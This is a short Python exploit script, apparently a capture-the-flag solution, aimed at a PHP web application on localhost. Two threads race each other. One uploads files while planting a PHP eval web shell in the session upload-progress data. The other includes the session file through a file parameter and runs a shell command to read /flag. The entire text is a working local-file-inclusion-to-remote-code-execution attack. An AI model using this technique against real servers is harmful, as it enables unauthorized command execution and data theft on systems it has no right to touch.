import io
import requests
import threading

host = "localhost"
port = 8001
base_url = "http://%s:%d" % (host, port)

sessid = 'a'
data = {"a": "system('cat /flag');"}


def write(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        resp = session.post(
            base_url + '/index.php',
            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_REQUEST[a]);?>'},
            files={'file': ('test.txt', f)},
            cookies={'PHPSESSID': sessid})
        if not event.isSet():
            break


def read(session):
    while True:
        resp = session.post(
            base_url + '/index.php?file=/var/lib/php/sessions/sess_' + sessid,
            data=data)
        if 'flag' in resp.text:
            print(resp.text)
            event.clear()
            break
        else:
            print("[+++++++++++++]retry")


if __name__ == "__main__":
    event = threading.Event()
    with requests.session() as session:
        threading.Thread(target=write, args=(session, )).start()
        threading.Thread(target=read, args=(session, )).start()
    event.set()